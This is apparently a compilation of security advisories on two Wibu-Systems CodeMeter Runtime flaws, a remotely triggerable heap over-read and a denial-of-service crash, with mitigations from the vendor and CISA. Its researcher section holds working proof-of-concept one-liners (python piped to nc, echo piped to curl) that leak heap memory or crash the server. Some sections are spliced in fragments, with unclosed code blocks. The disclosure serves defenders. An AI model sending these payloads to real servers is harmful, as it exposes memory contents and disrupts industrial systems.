# Multiple Vulnerabilities in Wibu-Systems CodeMeter

Critical

[← View More Research Advisories](/security/research)
### Synopsis

### CVE-2021-20093: CmLAN Server Unencrypted Message Buffer Over-read

The CodeMeter CmLAN server allows unencrypted messages from remote clients if the message body starts with '\xA2\x05'. When generating a response, the server copies data from a heap-based buffer of 0x100 bytes to an output buffer to be sent in the response. The amount to copy is controlled by the client. An unauthenticated remote attacker can exploit this issue to disclose heap memory contents or crash the CodeMeter Runtime Server (i.e., CodeMeter.exe), depending on the size of the message sent to the server.

The following code snippet shows the vulnerability:

**CodeMeter.exe 7.20.4402.501**
```
[...]
.text:0050FB0B    lea     eax, [edi+YS0001.buf]   ; heap buffer of 0x100 bytes
.text:0050FB0E    push    [edi+YS0001.bufsz]      ; attacker-controlled copy size
.text:0050FB0E                                    ; buffer over-read -> info disclosure or DoS
.text:0050FB11    push    eax
.text:0050FB12    lea     eax, [ecx+8]            ; output buffer in the response
.text:0050FB15    push    eax
.text:0050FB16    call    _memmove
[...]

```

The following PoC can be used to disclose heap memory contents:

```
python3 -c "import os,struct; size=0x200; os.write(1,b'samc'+struct.pack('<LHHL',size+2,0x71,1,0)+b'\xA2\x05'+b'A'*size)" | nc <CmHost> <CmLANServerPort> | xxd

#### Proof of Concept

The following PoC can be used to crash the CodeMeter Runtime Server (i.e., CodeMeter.exe):

```
python3 -c "import os,struct; size=0x1000000; os.write(1,b'samc'+struct.pack('<LHHL',size+2,0x71,1,0)+b'\xA2\x05'+b'A'*size)" | nc <CmHost> <CmLANServerPort> > /dev/null

python3 -c "import os,struct; size=0x1000000; os.write(1,b'samc'+struct.pack('<LHHL',size+2,0x71,1,0)+b'\xA2\x05'+b'A'*size)" | nc <CmHost> <CmLANServerPort> > /dev/null
Traceback (most recent call last):
  File "<string>", line 1, in <module>
BrokenPipeError: [Errno 32] Broken pipe

```

The following shows the access violation exception caused by the buffer over-read:

```

### CVE-2021-20094: CmWAN Server Unencrypted Message Remote DoS

The CodeMeter CmWAN server allows unencrypted messages from remote clients if the message body starts with '\xA2\x05'. When processing the message, the server calls an invalid C++ virtual function, resulting in an access violation exception leading to process termination. An unauthenticated remote attacker can exploit this issue to crash the CodeMeter Runtime Server (i.e., CodeMeter.exe).

The following code snippet shows the vulnerability:

**CodeMeter.exe 7.20.4402.501**
```
[...]
.text:004FB799    mov     edx, [ebp+pYS0083]
.text:004FB79C    xor     ecx, ecx
.text:004FB79E    add     esp, 0Ch
.text:004FB7A1    cmp     [ebp+buf.cbData], ecx
.text:004FB7A4    cmovnz  ecx, [ebp+buf.pbData]
.text:004FB7A8    mov     eax, [edx]
.text:004FB7AA    push    ecx
.text:004FB7AB    mov     ecx, edx
.text:004FB7AD    mov     eax, [eax+28h]
.text:004FB7B0    call    eax                     ; 0095f758 for CmWAN server
[...]

```

The code calls the virtual function at offset 0x28 of the vftable for class YS0083. However, the DWORD at the offset doesn't point to a function in a code section. Instead it points to somewhere (i.e., 0095f758) in a read-only section that doesn't contain code.

**CodeMeter.exe 7.20.4402.501**
```
[...]

#### Proof of Concept

The following PoC can be used to crash the CodeMeter Runtime Server (i.e., CodeMeter.exe):

```
echo -ne '\xa2\x05\x00\x00\x00\x00' | curl -m 10 -H 'Content-Type: application/x-wibucm-coreapi' --data-binary @- http://<CmHost>:<CmWANServerPort>/
curl: (56) Failure when receiving data from the peer

echo -ne '\xa2\x05\x00\x00\x00\x00' | curl -m 10 -H 'Content-Type: application/x-wibucm-coreapi' --data-binary @- http://<CmHost>:<CmWANServerPort>/
curl: (7) couldn't connect to host
```

Security Advisory WIBU-210423-01

Vulnerability Title

CodeMeter Runtime Network Server: Heap Leak and Denial of Service

Vulnerability description

An attacker could send a specially crafted packet that could have the CodeMeter Runtime Network
Server send back packets containing data from the heap or crash the server.

•  CVE: CVE-2021-20093
•  CVSS v3.1 base score: 9.1
•  CVSS v3.1 vector string: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H
•  Vulnerability type: CWE-126

Vulnerability details

An attacker could send a specially crafted TCP/IP packet that causes the CodeMeter Runtime
network server (default port 22350) to return packets containing data from the heap. When
generating a response, the server copies data from a heap-based buffer to an output buffer to be
sent in the response. The amount to copy is controlled by the client. An unauthenticated remote
attacker can exploit this issue to disclose heap memory contents or crash the CodeMeter Runtime
Server (i.e., CodeMeter.exe).

Affected products

Product name
CodeMeter Runtime

Affected versions
All versions

Fixed versions
7.21a

Mitigation for affected versions

•  Run CodeMeter as client only and use localhost as binding for the CodeMeter

communication. With binding to localhost an attack is no longer possible via remote network
connection. The network server is disabled by default.
If it is not possible to disable the network server, using a host-based firewall to restrict access
to the CmLAN port can reduce the risk.

•

General security best practices can help to protect systems from local and network attacks.

Historian.

SIMATIC PCS neo is a distributed control system (DCS).

SIMATIC Process Historian is the long term archive system for SIMATIC PCS 7, SIMATIC WinCC and
SIMATIC PCS neo. It stores process values, alarms and batch data of production plants in its database
and offers historical process data to reporting and visualization applications.

SIMATIC WinCC Open Architecture (OA) is part of the SIMATIC HMI family. It is designed for use in
applications requiring a high degree of customer-speciﬁc adaptability, large or complex applications and
projects that impose speciﬁc system requirements or functions.

SIMIT Simluation Platform allows the simulation of plant setups in order to anticipate faults in the early
planning phase.

SINEC INS (Infrastructure Network Services) is a web-based application that combines various network
services in one tool. This simpliﬁes installation and administration of all network services relevant for
industrial networks.

SINEMA Remote Connect is a management platform for remote networks that enables the simple
management of tunnel connections (VPN) between headquarters, service technicians, and installed
machines or plants. It provides both the Remote Connect Server, which is the server application, and the
Remote Connect Client, which is an OpenVPN client for optimal connection to SINEMA Remote Connect
Server.

VULNERABILITY CLASSIFICATION

The vulnerability classiﬁcation has been performed by using the CVSS scoring system in version 3.1
(CVSS v3.1) (https://www.ﬁrst.org/cvss/). The CVSS environmental score is speciﬁc to the customer’s
environment and will impact the overall CVSS score. The environmental score should therefore be
individually deﬁned by the customer to accomplish ﬁnal scoring.

An additional classiﬁcation has been performed using the CWE classiﬁcation, a community-developed list
of common software security weaknesses. This serves as a common language and as a baseline for
weakness identiﬁcation, mitigation, and prevention efforts. A detailed list of CWE classes can be found at:
https://cwe.mitre.org/.

Vulnerability CVE-2021-20093

A buffer over-read vulnerability in the CodeMeter Runtime network server could cause the server to
return packets containing data from the heap.

# Wibu-Systems CodeMeter Runtime

Last RevisedJuly 29, 2021
Alert CodeICSA-21-210-02

## 1. EXECUTIVE SUMMARY

* **CVSS v3 9.1**
* **ATTENTION:** Exploitable remotely/low attack complexity
* **Vendor:** Wibu-Systems AG
* **Equipment:** CodeMeter Runtime
* **Vulnerabilities:** Buffer Over-read

## 2. RISK EVALUATION

Successful exploitation of these vulnerabilities could allow an attacker to read data from the heap of the CodeMeter Runtime network server, or crash the CodeMeter Runtime Server (i.e., CodeMeter.exe).

## 3. TECHNICAL DETAILS

### 3.1 AFFECTED PRODUCTS

The following versions of CodeMeter Runtime, a license manager, are affected:

* CodeMeter Runtime: All versions prior to v7.21a

This license manager is used in the products of many different vendors.

### 3.2 VULNERABILITY OVERVIEW

#### 3.2.1    [BUFFER OVER-READ CWE-126](https://cwe.mitre.org/data/definitions/126.html)

An attacker could send a specially crafted packet to the CodeMeter Runtime CmWAN server to cause a denial-of-service condition.

[CVE-2021-20094](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2021-20094) has been assigned to this vulnerability. A CVSS v3 base score of 7.5 has been calculated; the CVSS vector string is ([AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)).

#### 3.2.2    [BUFFER OVER-READ CWE-126](https://cwe.mitre.org/data/definitions/126.html)

An attacker could send a specially crafted packet that could crash the server or direct the CodeMeter Runtime Network Server to send back packets containing data from the heap.

[CVE-2021-20093](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2021-20093) has been assigned to this vulnerability. A CVSS v3 base score of 9.1 has been calculated; the CVSS vector string is ([AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H)).

### 3.3 BACKGROUND

* **CRITICAL INFRASTRUCTURE SECTORS:** Multiple
* **COUNTRIES/AREAS DEPLOYED:** Worldwide
* **COMPANY HEADQUARTERS LOCATION:** Germany

### 3.4 RESEARCHER

Tenable, Inc., reported these vulnerabilities to CISA.

## 4. MITIGATIONS

Wibu-Systems recommends the following mitigations:

* Update to Version 7.21a or later.

**CVE-2021-20093:**

* Run CodeMeter as client only and use localhost as binding for the CodeMeter communication. With binding to localhost an attack is no longer possible via remote network connection. The network server is disabled by default.
* If it is not possible to disable the network server, using a host-based firewall to restrict access to the CmLAN port can reduce the risk.

**CVE-2021-20094:**

* The CmWAN server is disabled by default. Check if CmWAN is enabled and disable the feature if it is not needed.
* Run the CmWAN server only behind a reverse proxy with user authentication to prevent attacks from unauthenticated users.
* The risk of an unauthenticated attacker can be further reduced by using a host-based firewall that only allows the reverse proxy to access the CmWAN port.

For more information on this issue, please see Wibu security advisories: [WIBU-210423-01](https://cdn.wibu.com/fileadmin/wibu_downloads/security_advisories/Advisory_WIBU-210423-01.pdf), [WIBU-210423-02](https://cdn.wibu.com/fileadmin/wibu_downloads/security_advisories/Advisory_WIBU-210423-02.pdf)

For more information on products dependent on the affected CodeMeter see the following vendor security advisories. As new instances are discovered/reported, they will be added to this list:

* Siemens: [SSA-675303](https://cert-portal.siemens.com/productcert/pdf/ssa-675303.pdf)

CISA recommends users take defensive measures to minimize the risk of exploitation of this vulnerability. Specifically, users should:

* Minimize network exposure for all control system devices and/or systems, and ensure that they are [not accessible from the Internet](https://us-cert.cisa.gov/ics/alerts/ICS-ALERT-10-301-01).
* Locate control system networks and remote devices behind firewalls, and isolate them from the business network.
* When remote access is required, use secure methods, such as Virtual Private Networks (VPNs), recognizing VPNs may have vulnerabilities and should be updated to the most current version available. Also recognize VPN is only as secure as its connected devices.

CISA reminds organizations to perform proper impact analysis and risk assessment prior to deploying defensive measures.

CISA also provides a section for [control systems security recommended practices](https://us-cert.cisa.gov/ics/recommended-practices) on the ICS webpage on [us-cert.cisa.gov](https://us-cert.cisa.gov/ics). Several recommended practices are available for reading and download, including [Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies](https://us-cert.cisa.gov/sites/default/files/recommended_practices/NCCIC_ICS-CERT_Defense_in_Depth_2016_S508C.pdf).

Additional mitigation guidance and recommended practices are publicly available on the [ICS webpage on us-cert.cisa.gov](https://us-cert.cisa.gov/ics) in the Technical Information Paper, [ICS-TIP-12-146-01B--Targeted Cyber Intrusion Detection and Mitigation Strategies](https://us-cert.cisa.gov/ics/tips/ICS-TIP-12-146-01B).

Organizations observing any suspected malicious activity should follow their established internal procedures and report their findings to CISA for tracking and correlation against other incidents.

No known public exploits specifically target these vulnerabilities.
